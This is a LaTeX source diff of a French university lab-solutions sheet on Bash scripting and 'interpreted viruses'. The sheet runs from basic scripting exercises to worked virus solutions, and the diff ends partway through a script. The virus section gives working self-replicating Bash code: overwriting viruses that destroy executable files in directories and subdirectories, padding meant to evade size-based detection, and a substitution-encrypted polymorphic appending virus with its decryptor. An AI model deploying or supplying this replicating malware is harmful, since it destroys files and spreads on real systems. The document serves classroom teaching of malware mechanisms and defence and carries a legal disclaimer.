@@ -1,0 +1,971 @@
+\documentclass[a4paper,11pt]{article}
+
+\usepackage{fullpage}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+\usepackage{graphicx}
+\usepackage{latexsym}
+\usepackage{float}
+\usepackage{comment}
+\usepackage{array}
+\usepackage{booktabs}
+
+% --- Packages added for pedagogical enrichment ---
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{hyperref}
+
+%%%%%%%%%%%%%%% LISTINGS CONFIGURATION %%%%%%%%%%%%%%%%%%%
+
+\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{codered}{rgb}{0.7,0.1,0.1}
+\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
+\definecolor{backcolour}{rgb}{0.97,0.97,0.97}
+
+\lstset{
+    language=bash,
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen}\itshape,
+    keywordstyle=\color{codeblue}\bfseries,
+    stringstyle=\color{codered},
+    basicstyle=\ttfamily\small,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=8pt,
+    numberstyle=\tiny\color{codegray},
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=4,
+    frame=single,
+    rulecolor=\color{codegray},
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+    literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1 {î}{{\^i}}1 {ô}{{\^o}}1
+}
+
+%%%%%%%%%%%%%%% TCOLORBOX ENVIRONMENTS %%%%%%%%%%%%%%%%%%
+
+% Course reminder (light blue background)
+\newtcolorbox{rappel}[1][]{
+    colback=blue!5!white,
+    colframe=blue!50!black,
+    fonttitle=\bfseries,
+    title={\large Course Reminder},
+    #1
+}
+
+% Key takeaway (light green background)
+\newtcolorbox{pointcle}[1][]{
+    colback=green!5!white,
+    colframe=green!40!black,
+    fonttitle=\bfseries,
+    title={Key Takeaway},
+    #1
+}
+
+% Warning (light orange background)
+\newtcolorbox{attention}[1][]{
+    colback=orange!8!white,
+    colframe=orange!60!black,
+    fonttitle=\bfseries,
+    title={Warning},
+    #1
+}
+
+% Ethical disclaimer (red background)
+\newtcolorbox{ethique}[1][]{
+    colback=red!5!white,
+    colframe=red!60!black,
+    fonttitle=\bfseries\large,
+    title={Ethical and Legal Disclaimer},
+    #1
+}
+
+%%%%%%%%%%%%%%% COMMANDS %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\itemb}{\item[$\bullet$]}
+
+%% Modelisation sets
+\newcommand{\Ki}{\mathcal{K}}
+\newcommand{\Ci}{\mathcal{C}}
+\newcommand{\Mi}{\mathcal{M}}
+\newcommand{\Ei}{\mathcal{E}}
+\newcommand{\Di}{\mathcal{D}}
+
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+
+%%%%%%%%%%%%%%% ENVIRONMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemma}
+\newtheorem{algorithme}{Algorithm}
+\newtheorem{corolaire}{Corollary}
+\newtheorem{propriete}{Property}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme}{Theorem}
+\newtheorem{definition}{Definition}
+\newtheorem{correction}{Answer}
+%\excludecomment{correction}
+
+\theoremstyle{definition}
+\newtheorem*{probleme}{Problem}
+\newtheorem*{cout}{Cost}
+\newtheorem*{fait}{Fact}
+\newtheorem*{notation}{Notation}
+\newtheorem*{complexite}{Complexity}
+\newtheorem{exercice}{Exercise}
+\newtheorem{remarque}{Remark}
+\newtheorem{exemple}{Example}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue!60!black,
+    urlcolor=blue!60!black
+}
+
+%%%%%%%%%%%%%% DOCUMENT %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{University of Perpignan} \hfill  L3 Computer Science \\
+ \hfill C. Legrand \hfill  Year \the\year  \\
+\smallskip
+\begin{center}
+{
+ {\scshape \large Lab Work 3 -- Computer Security -- Solutions}  \\
+ Interpreted Viruses
+}
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+
+\bigskip
+
+% --- Ethical disclaimer ---
+\begin{ethique}
+The techniques presented in this lab work are studied within a \textbf{strictly academic context} in order to understand the mechanisms used by malicious software and thus be better able to defend against them.
+
+\textbf{Any use of these techniques outside the educational context is illegal} and punishable by criminal penalties (Chapter III of the French Penal Code, Articles 323-1 to 323-8 -- \textit{Offences against Automated Data Processing Systems}):
+\begin{itemize}
+    \item Unauthorized access to or remaining in an ADPS (Art.~323-1): \textbf{3 years} imprisonment and \textbf{\texteuro{}100,000} fine
+    \item Obstructing the operation of an ADPS (Art.~323-2): \textbf{5 years} imprisonment and \textbf{\texteuro{}150,000} fine
+    \item Fraudulent introduction of data into an ADPS (Art.~323-3): \textbf{5 years} imprisonment and \textbf{\texteuro{}150,000} fine
+\end{itemize}
+Penalties increased to \textbf{7 years} and \textbf{\texteuro{}300,000} when the targeted system processes personal data operated by the State, and up to \textbf{10 years} and \textbf{\texteuro{}300,000} for organized crime (Art.~323-4-1). \textit{Penalties updated by the LOPMI law no.~2023-22 of January 24, 2023.}
+\end{ethique}
+
+\bigskip
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 1: Some BASH Scripts
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Some BASH Scripts}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 1: Basic BASH Scripts
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}
+
+ You will write your first script. Don't forget to give the file execution permission before running it.
+\begin{enumerate}
+\item Write a script that displays the following information
+\begin{itemize}
+\itemb A sentence containing the user's name and the type of shell being used;
+\itemb The date (use the \verb|date| command).
+\end{itemize}
+\item Modify the previous script so that it also indicates the season based on the current date.
+\end{enumerate}
+\end{exercice}
+
+% --- Course reminder ---
+\begin{rappel}
+\textbf{Bash Scripting Basics:}
+
+A Bash script is a text file containing a sequence of commands interpreted by the shell. It must start with a \textbf{shebang} that specifies the interpreter to use:
+\begin{lstlisting}[numbers=none]
+#!/bin/bash
+\end{lstlisting}
+
+To make a script executable: \texttt{chmod +x my\_script.sh}
+
+\medskip
+\textbf{Useful predefined variables:}
+\begin{itemize}
+    \item \texttt{\$USER}: current user's name
+    \item \texttt{\$SHELL}: path to the current shell (e.g., \texttt{/bin/bash})
+    \item \texttt{\$HOME}: user's home directory
+    \item \texttt{\$PWD}: current working directory
+\end{itemize}
+
+\medskip
+\textbf{Command substitution:} \texttt{\$(command)} executes \texttt{command} and replaces the expression with its standard output. Example: \texttt{month=\$(date +\%m)} stores the month number in the variable \texttt{month}.
+
+\medskip
+\textbf{Conditional structure:}
+\begin{lstlisting}[numbers=none]
+if [ condition ]; then
+    commands
+elif [ condition ]; then
+    commands
+fi
+\end{lstlisting}
+
+\medskip
+\textbf{Integer comparison operators:}
+
+\begin{center}
+\begin{tabular}{lll}
+\toprule
+\textbf{Operator} & \textbf{Meaning} & \textbf{Example} \\
+\midrule
+\texttt{-eq} & Equal to & \texttt{[ \$a -eq \$b ]} \\
+\texttt{-ne} & Not equal to & \texttt{[ \$a -ne \$b ]} \\
+\texttt{-lt} & Less than & \texttt{[ \$a -lt \$b ]} \\
+\texttt{-gt} & Greater than & \texttt{[ \$a -gt \$b ]} \\
+\texttt{-le} & Less than or equal to & \texttt{[ \$a -le \$b ]} \\
+\texttt{-ge} & Greater than or equal to & \texttt{[ \$a -ge \$b ]} \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\medskip
+\textbf{Combining conditions:} \texttt{-a} (logical AND), \texttt{-o} (logical OR). Example: \texttt{[ \$a -gt 3 -a \$a -le 6 ]}.
+\end{rappel}
+
+
+\begin{correction}
+The following script answers the exercise questions:
+\begin{lstlisting}
+#!/bin/bash
+
+echo "Hello $USER, you are using the shell $SHELL"
+echo "Today is $(date +%D)"
+
+# indicate the season (for simplicity, only the month is considered
+mois=$(date +%m)
+
+if [ $mois -le 3 ]
+then
+echo "It is winter"
+elif [ $mois -gt 3 -a  $mois -le 6 ]
+then
+echo "It is spring"
+elif [ $mois -gt 6 -a  $mois -le 9 ]
+then
+echo "It is summer"
+elif [ $mois -gt 9 -a  $mois -le 12 ]
+then
+echo "It is autumn"
+fi
+echo "The processor frequency is:"
+cat /proc/cpuinfo | grep GHz | head -n 1 | cut -d "@" -f2
+\end{lstlisting}
+
+\begin{attention}
+In Bash, there must be \textbf{no spaces} around the \texttt{=} sign when assigning a variable.
+\begin{itemize}
+    \item \texttt{mois=\$(date +\%m)} \quad $\checkmark$ \quad correct
+    \item \texttt{mois = \$(date +\%m)} \quad $\times$ \quad error: Bash interprets \texttt{mois} as a command
+\end{itemize}
+However, spaces are \textbf{mandatory} inside the test brackets: \texttt{[ \$mois -le 3 ]}.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item The \textbf{shebang} (\texttt{\#!/bin/bash}) on the first line tells the system which interpreter to use.
+    \item Predefined variables \texttt{\$USER}, \texttt{\$SHELL}, \texttt{\$HOME} provide access to environment information.
+    \item \textbf{Command substitution} \texttt{\$(command)} captures a command's output into a variable.
+    \item Integer comparison operators (\texttt{-eq}, \texttt{-ne}, \texttt{-lt}, \texttt{-gt}, \texttt{-le}, \texttt{-ge}) are Bash-specific and differ from C operators.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 2: While Loops (countdown)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}
+Recall that the syntax for the while loop in bash is as follows:
+\begin{lstlisting}[numbers=none]
+  while test
+  do
+    command(s)
+  done
+\end{lstlisting}
+\begin{enumerate}
+\item
+Write a script called \texttt{countdown} that prints to standard output something like
+\begin{lstlisting}[numbers=none,language={}]
+    10
+    9
+    8
+    7
+    6
+    5
+    4
+    3
+    2
+    1
+    GO!
+\end{lstlisting}
+\item Modify the \texttt{countdown} script so that it takes as parameter the number from which to start the countdown.
+\end{enumerate}
+\end{exercice}
+
+% --- Course reminder ---
+\begin{rappel}
+\textbf{The \texttt{while} loop in Bash:}
+
+The \texttt{while} loop executes a block of commands as long as the condition (test) is true (return code 0):
+\begin{lstlisting}[numbers=none]
+while [ condition ]
+do
+    commands
+done
+\end{lstlisting}
+
+\medskip
+\textbf{Bash arithmetic:}
+\begin{itemize}
+    \item \texttt{\$((\$var - 1))}: arithmetic evaluation (subtraction)
+    \item \texttt{\$((\$var + 1))}: arithmetic evaluation (addition)
+    \item \texttt{let "var=var+1"}: alternative using \texttt{let}
+\end{itemize}
+
+\medskip
+\textbf{Positional parameters and special variables:}
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+\textbf{Variable} & \textbf{Meaning} \\
+\midrule
+\texttt{\$0} & Name of the currently running script \\
+\texttt{\$1}, \texttt{\$2}, \ldots & 1st, 2nd, \ldots{} argument passed to the script \\
+\texttt{\$\#} & Number of arguments passed to the script \\
+\texttt{\$@} & All arguments (as a list) \\
+\texttt{\$?} & Return code of the last command (0 = success) \\
+\texttt{\$\$} & PID of the current process (the script) \\
+\texttt{\$!} & PID of the last background process \\
+\bottomrule
+\end{tabular}
+\end{center}
+\end{rappel}
+
+\begin{correction}
+The script answering question 1 is as follows
+\begin{lstlisting}
+#!/bin/bash
+compteur=10
+while [ $compteur -gt 0 ]
+do
+ echo $compteur
+ compteur=$(($compteur-1))
+done
+\end{lstlisting}
+for question 2, simply change the assignment \texttt{compteur=10} to \texttt{compteur=\$1}
+
+\begin{pointcle}
+\begin{itemize}
+    \item The \texttt{while} loop tests its condition \textbf{before} each iteration (zero iterations possible if the condition is false from the start).
+    \item Bash arithmetic is done via \texttt{\$((\ldots))}; the standard operators \texttt{+}, \texttt{-}, \texttt{*}, \texttt{/}, \texttt{\%} are available.
+    \item \texttt{\$1} refers to the first argument passed to the script on the command line.
+    \item \textbf{Parameterization} of a script (replacing constants with parameters) makes it reusable in different contexts.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 3: Directory Traversal
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}
+\begin{enumerate}
+\item Write a bash script that iterates through the contents of a directory and counts the number of regular files and directories, displaying both numbers at the end.
+\item  (Optional) Write a script that traverses a file tree and outputs to standard output the names of files whose last modification date precedes a date given as parameter.
+\end{enumerate}
+\end{exercice}
+
+% --- Course reminder ---
+\begin{rappel}
+\textbf{The \texttt{for} loop in Bash:}
+
+The \texttt{for} loop iterates over a list of values:
+\begin{lstlisting}[numbers=none]
+for variable in list
+do
+    commands
+done
+\end{lstlisting}
+Example: \texttt{for file in *} iterates over all files in the current directory.
+
+\medskip
+\textbf{Bash functions:}
+\begin{lstlisting}[numbers=none]
+function function_name {
+    commands
+    # $1 = first argument of the function
+}
+function_name arg1 arg2   # call
+\end{lstlisting}
+
+\medskip
+\textbf{File tests:}
+
+\begin{center}
+\begin{tabular}{lll}
+\toprule
+\textbf{Operator} & \textbf{Meaning} & \textbf{Example} \\
+\midrule
+\texttt{-f} & Regular file & \texttt{[ -f "\$f" ]} \\
+\texttt{-d} & Directory & \texttt{[ -d "\$f" ]} \\
+\texttt{-e} & Exists (file or directory) & \texttt{[ -e "\$f" ]} \\
+\texttt{-x} & Executable & \texttt{[ -x "\$f" ]} \\
+\texttt{-w} & Writable & \texttt{[ -w "\$f" ]} \\
+\texttt{-r} & Readable & \texttt{[ -r "\$f" ]} \\
+\texttt{-s} & Non-zero size (non-empty) & \texttt{[ -s "\$f" ]} \\
+\texttt{-L} & Symbolic link & \texttt{[ -L "\$f" ]} \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\medskip
+\textbf{The \texttt{export} command:} makes a variable accessible to child processes (sub-shells, called scripts). Without \texttt{export}, a variable is only visible in the current shell.
+\end{rappel}
+
+\begin{correction}
+\begin{itemize}
+\item Question 1.
+\begin{lstlisting}
+#!/bin/bash
+
+nbrep=0
+nbfic=0
+
+for file in *
+do
+#echo $file
+if [ -f $file ]
+then
+    nbfic=$(($nbfic+1))
+fi
+if [ -d $file ]
+then
+    nbrep=$(($nbrep+1))
+fi
+done
+
+echo "number of regular files= $nbfic"
+echo "number of directories= $nbrep"
+\end{lstlisting}
+
+\item Question 2. A practical solution here is to use a recursive function. For simplicity, we compare the creation date with only the year given as parameter.
+
+\begin{lstlisting}
+#!/bin/bash
+
+anneelim=$1
+export anneelim
+
+function rec {
+    #echo $1
+    for i in *
+    do
+	if [ -d "$i" ]
+	then
+	    cd $i
+	    rec $i
+	elif [ -f "$i" ]
+	then
+             # we retrieve the year of
+	    DT=$(ls --full-time $i | cut -d " " -f6)
+
+	    annee=$(echo $DT | cut -d "-" -f1)
+	    #echo "$DT et $annee"
+            # we compare with the year given as script parameter
+	    if [ $annee -gt  $anneelim ]
+	    then
+		echo "$i was created on $DT and is located in $(pwd)"
+	    fi
+	fi
+    done
+}
+
+rec ./
+\end{lstlisting}
+\end{itemize}
+
+\begin{attention}
+Remember to put \textbf{quotes} around variables containing file names: \texttt{"\$file"} instead of \texttt{\$file}. If a file name contains spaces (e.g., \texttt{my file.txt}), the shell will interpret each word as a separate argument without quotes, causing errors.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item The loop \texttt{for file in *} iterates over all files and directories in the current directory.
+    \item The tests \texttt{-f} (regular file) and \texttt{-d} (directory) allow distinguishing between entry types.
+    \item \textbf{Recursion} in Bash is achieved through functions that call themselves after a \texttt{cd} into subdirectories.
+    \item \texttt{export} is essential for a variable to be visible in recursive calls (sub-shells).
+    \item \texttt{ls --full-time} displays the full last modification date, useful for time-based comparisons.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 2: Bash Virus Programming
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Bash Virus Programming}
+
+{\Large Method:} During your development and testing, proceed as follows:
+\begin{itemize}
+\item Edit your virus along with a target script (that simply echoes ``target'') in a working directory.
+\item To test, copy the virus and the target script into a subdirectory, execute it, and analyze what happened.
+\end{itemize}
+For added safety (which we won't do in lab since the viruses created here only spread within the test directory), using a virtual machine is recommended.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 4: Improving the UNIX_OWR virus
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Improving the \texttt{UNIX\_OWR} virus]$\;$
+
+\begin{enumerate}
+\item Modify the \texttt{UNIX\_OWR} virus so that its action extends to subdirectories and only targets executable files, other than the currently infecting file.
+\item How can we counter the uniformity of file sizes after infection?
+\end{enumerate}
+\end{exercice}
+
+% --- Course reminder ---
+\begin{rappel}
+\textbf{Anatomy of an overwriting virus in Bash:}
+
+An overwriting virus replaces the contents of the target file with its own code via the command \texttt{cp \$0 \$target\_file}. This is the simplest type of virus but also the most destructive: the original program is irretrievably lost.
+
+\medskip
+\textbf{Key commands:}
+\begin{itemize}
+    \item \texttt{cp \$0 \$file}: copies the currently running script (\texttt{\$0}) over the target file
+    \item \texttt{basename \$0}: extracts the file name without the path (e.g., \texttt{basename /home/user/virus.sh} $\rightarrow$ \texttt{virus.sh})
+\end{itemize}
+
+\medskip
+\textbf{Text diagram -- overwriting infection:}
+
+\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white},language={}]
+BEFORE infection:              AFTER infection:
++---------------------+       +---------------------+
+| Original program    |       | Virus code          |
+| (useful content)    |       | (copy of $0)        |
+| ...                 |       | ...                 |
+| N lines             |       | M lines (M != N)    |
++---------------------+       +---------------------+
+
+Consequence: the original program is DESTROYED.
+The file size changes (N -> M lines).
+\end{lstlisting}
+
+\medskip
+\textbf{Size uniformity problem:} after infection, all infected files have the same size (that of the virus). This is an easily detectable \textbf{indicator of compromise} (IoC).
+\end{rappel}
+
+\begin{correction}
+\begin{enumerate}
+\item The following code answers the question.
+We only descend one level into subdirectories.
+\begin{lstlisting}
+#!/bin/bash
+
+#Overwriter I
+for file in *; do #for every file
+    if [ -d $file ]; then # if we encounter a directory
+       cd $file #we move into this directory
+       for file1 in *; do #for every file in the directory
+	   if [ -x $file1 -a -w $file1 ]; then
+               cp "../$0" $file1 #overwrite target file with virus
+	   fi
+       done
+       cd ..
+    fi
+    echo $file
+    name1=$(basename $0)
+    name2=$(basename "./$file")
+    echo "$name1 != $name2 ??"
+    if [ "$name1" != "$name2" ]
+    then
+	echo "oui pour $name2"
+	if [  -x $file -a -w $file ]; then
+	    echo "cp $0 $file"
+            cp $0 $file #overwrite target file with virus
+	fi
+    fi
+done
+\end{lstlisting}
+
+If we wanted to infect the entire file tree of the directory (subdirectories, sub-subdirectories, etc.), we would need to use a recursive function, with copying done from the absolute path containing the infecting file.
+
+\begin{attention}
+The virus must avoid self-infection! The comparison \texttt{basename \$0 != basename ./\$file} is essential. Without this check, the command \texttt{cp \$0 \$0} would overwrite the virus with itself, potentially corrupting it.
+\end{attention}
+
+\item  The technique used here is to add the line \texttt{echo \"adding padding lines\"} to maintain the same number of lines as in the original file.
+
+
+\begin{lstlisting}
+#!/bin/bash
+
+#Overwritter I
+for file in *; do #for every file
+    if [ -d $file ]; then # if we encounter a directory
+       cd $file #we move into this directory
+       for file1 in *; do #for every file in the directory
+	   if [ -x $file1 -a -w $file1 ]; then
+               nbligne=$(wc -l $file | cut -d" " -f 1  )
+               cp "../$0" $file1 #overwrite target file with virus
+               count=0
+	       while [ $count -le $(($nbligne - 37)) ]; do
+	         echo "echo \"on rajoute deslignes\"" >> $file
+	         count=$(($count+1))
+	       done
+	       echo "$count $nbligne $file"
+	   fi
+       done
+       cd ..
+    fi
+    name1=$(basename $0)
+    name2=$(basename "./$file")
+    echo "$name1 != $name2 ??"
+    if [ "$name1" != "$name2" ]
+    then
+	if [ -x $file -a -w $file -a "$0" != "./$file" ]; then
+            nbligne=$(wc -l $file | cut -d" " -f 1  )
+            cp $0 $file  #overwrite target file with virus
+            count=0
+	    while [ $count -le $(($nbligne - 37)) ]; do
+		echo "echo \"on rajoute deslignes\"" >> $file
+		count=$(($count+1))
+	    done
+	    echo "$count $nbligne $file"
+	fi
+    fi
+done
+\end{lstlisting}
+
+
+\end{enumerate}
+
+\begin{pointcle}
+\begin{itemize}
+    \item \texttt{cp \$0 \$file} is the core mechanism of an overwriting virus: it copies the virus over the target.
+    \item \texttt{basename} extracts the file name and prevents self-infection by comparing the virus name with the target name.
+    \item \textbf{Size uniformity} after infection is an indicator of compromise (IoC): all infected files have the same size as the virus.
+    \item \textbf{Padding} (\texttt{wc -l} + appending lines) preserves the original file size, making the infection harder to detect.
+    \item A full recursive traversal would require a recursive function with an absolute path for the virus copy.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 5: Substitution-encrypted virus
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}
+
+\begin{enumerate}
+\item Write a script that takes a file as argument and applies a character substitution to all or part of the characters.
+You may use the \texttt{tr} command for this.
+\item Using the code from the first question, create a version of \texttt{vbashp.sh} that adds its previously encrypted code to the target file.
+\item In a file containing the encrypted viral code from question 2: prepend a restoration code that
+\begin{itemize}
+\item selects the encrypted lines,
+\item decrypts them and puts them in a temporary file,
+\item Executes the temporary file to launch the infection phase.
+\end{itemize}
+\item What problem does the resulting virus still suffer from? Propose a strategy to solve this problem.
+\end{enumerate}
+
+\end{exercice}
+
+% --- Course reminder ---
+\begin{rappel}
+\textbf{The \texttt{tr} (translate) command:}
+
+\texttt{tr} performs character-by-character substitution on standard input:
+\begin{lstlisting}[numbers=none]
+echo "hello" | tr "helo" "HELO"   # outputs HELLO
+cat file.txt | tr ["abc"] ["xyz"]   # substitutes a->x, b->y, c->z
+\end{lstlisting}
+
+\medskip
+\textbf{Monoalphabetic substitution:}
+
+Each letter of the plaintext alphabet is replaced by a letter from the cipher alphabet, according to a fixed correspondence table.
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+\textbf{Alphabet} & \textbf{Mapping} \\
+\midrule
+Plaintext & \texttt{abcdefghijklmnopqrstuvwxyz} \\
+Cipher    & \texttt{hijabcdefgmnopqrstuvwxyzkl} \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+Example: \texttt{echo} (plaintext) $\rightarrow$ \texttt{bjdq} (cipher), \texttt{bash} $\rightarrow$ \texttt{ihue}.
+
+\medskip
+\textbf{Interpreted polymorphism:}
+
+A polymorphic virus changes its appearance (encrypted code) with each infection while preserving the same behavior. In an interpreted language (Bash), the viral code is stored \textbf{encrypted} in the target file. At execution time:
+\begin{enumerate}
+    \item The \textbf{decryptor} (in cleartext) extracts and decrypts the viral part
+    \item The decrypted code is written to a temporary file
+    \item The temporary file is executed (infection phase)
+\end{enumerate}
+
+\medskip
+\textbf{Achilles' heel:} the decryptor remains \textbf{in cleartext} in every infected file. This is the weak point that antivirus software can exploit to build a signature.
+\end{rappel}
+
+\begin{correction}
+\begin{enumerate}
+\item
+We perform substitutions using the tr command: the short script below performs a substitution of the file \texttt{\$1} encoded in \texttt{tab1}
+\begin{lstlisting}
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="hijabcdefgmnopqrstuvwxyzkl"
+
+#cat $1 | tr  ["$tab1"] ["$tab0"] > fichier-$$.txt
+cat $1 | tr  ["$tab0"] ["$tab1"] > fichier-$$.txt
+\end{lstlisting}
+
+\item  We apply this technique to improve the \texttt{vbashp.sh} virus encrypted by substitution, prepending it with a restoration code.
+\begin{lstlisting}[language={}]
+#!/bin/bash
+
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="hijabcdefgmnopqrstuvwxyzkl"
+
+tail -n 11  $0 | tr  ["$tab1"] ["$tab0"] > fichier-$$.sh
+#cat $1 | tr  ["$tab0"] ["$tab1"] > fichier-$$.txt
+chmod u+x fichier-$$.sh
+#./fichier-$$.sh # uncomment this part to enable replication
+exit 0
+
+#!/ifp/ihue
+
+bjeq "jqab eqvb"
+
+cqt f fp *.ue;
+ aq # rqwt vqwu nbu cfjefbtu hxbj n'bzvbpufqp ue
+fc vbuv  "./$f" != "$0";
+   vebp # uf jfinb != cfjefbt fpcbjvhpv bp jqwtu
+   vhfn -p 9 $0  >> $f; # hgqwv jqab aw xftwu
+cf
+aqpb
+\end{lstlisting}
+
+\begin{attention}
+The \textbf{decryptor} (lines 1-10) is in cleartext in the infected file. This is the weak point of this technique: an antivirus can build a signature from the decryption code, even though the viral code itself changes with each infection.
+\end{attention}
+
+\item The following code answers the question
+
+\begin{lstlisting}
+#!/bin/bash
+
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="haigbcevrfwnyopjmqdstuxzkl"
+
+#Overwritter I
+for file in *; do #for every file
+    if [ -x $file -a "$0" != "./$file" -a "$name" != "./$file" ]; then
+	echo "infecting $file by adding encrypted viral code"
+        #We add the encrypted viral part
+	tail -n 11  $0 | tr  ["$tab1"] ["$tab0"] >> $file
+    fi
+done
+\end{lstlisting}
+
+
+\item The code is given below: there is a restoration part that decrypts the viral code into a temporary file, first adding the name of the infecting script along with the encryption/decryption substitution.
+\begin{lstlisting}[language={}]
+#!/bin/bash
+
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="haigbcevrfwnyopjmqdstuxzkl"
+
+echo "#!/bin/bash " > .temp1.sh
+echo "tab0=\"$tab0\"" >> .temp1.sh
+echo "tab1=\"$tab1\"" >> .temp1.sh
+echo "name=\"$0\"" >> .temp1.sh
+tail -28 $0 | tr  ["$tab0"] ["$tab1"]  >> .temp1.sh
+chmod u+x .temp1.sh
+./.temp1.sh
+exit 0
+
+#Ohgikicuugi I
+jni jczg cl *; sn #onvi unvu jcfacgi
+    cj [ -w $jczg -b "$0" != "./$jczg" -b "$lbqg" != "./$jczg" ]; uagl
+	gfan "cljgfucnl sg $jczg"
+	v=$$
+	v=$(($v % 26))
+	u=$ube1
+	c=0
+	kaczg [ $c -zg $v ]; sn
+	    u=$(gfan $u  |  ui ["$ube1"] ["$ube0"])
+	    c=$(($c+1))
+	snlg
+        #Ol gfibtg bhgf zg fnsg sg igtubvibucnl
+	#gfan "#!/ecl/ebta " > $jczg
+	gfan "ube0=\"$ube0\"" >> $jczg
+	gfan "ube1=\"$u\"" >> $jczg
+	gfan 'gfan "#!/ecl/ebta " > .ugqo1.ta' >> $jczg
+	gfan 'gfan "ube0=\"$ube0\"" >> .ugqo1.ta' >> $jczg
+	gfan 'gfan "ube1=\"$ube1\"" >> .ugqo1.ta' >> $jczg
+	gfan 'gfan "lbqg=\"$0\"" >> .ugqo1.ta' >> $jczg
+	gfan 'ubcz -l 28 $0 | ui  ["$ube0"] ["$ube1"] >> .ugqo1.ta' >> $jczg
+	gfan 'faqns v+w .ugqo1.ta' >> $jczg
+	gfan './.ugqo1.ta' >> $jczg
+	gfan 'gwcu 0' >> $jczg
+        gfan "$u"
+	ubcz -l 28  $0 | ui  ["$u"] ["$ube0"] >> $jczg
+    jc
+snlg
+\end{lstlisting}
+
+The same code but in cleartext is given below. It propagates by appending, and changes the encryption key with each infection.
+\begin{itemize}
+\item The code portion \texttt{u=\$\$ j... i=\$((i+1)) done} is used to randomize the substitution used for encryption.
+\item The code portion consisting of the series of echo statements corresponds to the restoration code.
+\item The addition of encrypted infecting code is done with the command \texttt{tail -n 29  \$0 | tr  ["\$tab1"] ["\$tab0"] >> \$file}.
+\end{itemize}
+\begin{lstlisting}
+#!/bin/bash
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="haigbcevrfwnyopjmqdstuxzkl"
+name="./vbashp-improved-avec-code-chiffre.sh"
+#Overwritter I
+for file in *; do #for every file
+    if [ -x $file -a "$0" != "./$file" -a "$name" != "./$file" ]; then
+	echo "infecting $file"
+	u=$$
+	u=$(($u % 26))
+	t=$tab1
+	i=0
+	while [ $i -le $u ]; do
